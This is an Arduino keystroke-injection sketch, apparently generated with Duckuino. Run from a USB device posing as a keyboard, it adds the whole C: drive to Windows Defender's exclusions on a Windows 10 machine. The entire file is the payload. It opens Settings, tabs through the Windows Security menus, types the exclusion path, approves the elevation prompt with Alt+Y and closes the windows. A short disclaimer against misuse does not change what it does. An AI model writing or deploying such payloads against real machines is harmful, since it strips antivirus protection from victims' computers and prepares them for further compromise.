/**
 * AUTHOR: Eddie Devine
 * TARGET: Windows 10
 * DESCRIPTION: Disables Windows Defender by telling it to ignore the C drive.
 * DO NOT USE THIS SCRIPT FOR HARMFUL OR ILLEGAL PURPOSES
 
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);
  
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("Settings"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(300);
  typeKey(KEY_TAB);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_DOWN_ARROW);

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("C:"));

  typeKey(KEY_TAB);

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(100);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
